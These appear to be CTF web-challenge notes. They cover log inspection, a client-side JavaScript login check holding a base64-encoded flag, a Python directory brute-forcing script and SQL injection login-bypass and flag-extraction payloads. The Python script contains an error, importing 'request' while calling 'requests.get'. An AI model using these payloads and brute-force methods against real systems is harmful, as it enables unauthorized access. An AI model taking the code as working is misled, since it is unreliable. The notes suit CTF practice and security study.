# Web Challenge
--------------------------

Method-1
------------
```
Note: If there is log file that contains recent traffic of a web server and you want to find the Source IP ?
Solution : Open the file and search for a HTTP "200" OK success status response code.
```

Method-2
--------------
``Note: Always check the source code of a website and see the javascriptfile``
```js
function checkCreds(usr, pass){

    if(usr.includes("admin")){
        if(btoa(pass) === "amN0ZnsxTV9zMF8xTV81b19EeW40TWl0M18wOTI0Nzh9"){
            alert("My Secrets: 1. I count in my sleep, 2. I hav")
        }
        else{
            alert("nice try Derrick")   
        }
    }
    else{
         alert("You fool!")   
    }

}

function login(){
    usr = document.getElementById('form3Example3').value
    pass = document.getElementById('form3Example4').value
    checkCreds(usr,pass)
}
```
Method-3
---------------
``Note: If there is Directory enumeration challenge where every request returns a random HTTP status code``.
``Solution: We have to send requests to all the pages in a wordlists and see if any of them respond with something that might be the flag``
```python
from multiprocessing.pool import Pool    # multiprocessing is a package that supports spawning processes using an API similar to the threading module
from sys import argv                  #System specific parameters and functions
import request                           # Make a request to a web page.

if len(argv) !=4:              # IF the length of the argument is not equall to 4(Suppose: length of the argument is 3)
    print(f'Usage:{argv[0]} <URL> <brute force file> <num threads>')  # Actual way of passing the arguments
    exit(1)                                                           # exiting the program
    
url = argv[1]           # Taking url as argument 1 from argv[] function
fname = argv[2]         # Taking the wordlist as argument 2
numthreads = int(argv[3])  # Taking the numberof threads as argument 3

def check_page(name):     #Function to check the page
    name=name.strip()      #It basically removes spaces
    r = requests.get(f'{url}/{name}')  # requests.get function is used to request the webpage with url/name(wordlist)
    if 'flagformat' in r.text:   #Here flagformat is what you are finding in r.text(response of a webpage)
        print(r.text)             #printing the response page
with open(fname,'r') as f:         #overhere we open the wordlist file giving the permission as read
    with Pool(processes=numthreads) as pool:
         pool.map(check_page,f,256)
        
```
Method-4
--------------
``IF there is a Login Page then check for sql injection with common payload``
```
username: admin
password: 'OR 1=1;--
```
``IF  we want to search the flag with flag ID or value then we can use this one``
```
' OR flag LIKE '<flagformat>{%
For Example: Suppose there is flagformat is abc{}
Then: ' OR flag LIKE 'abc{%
```

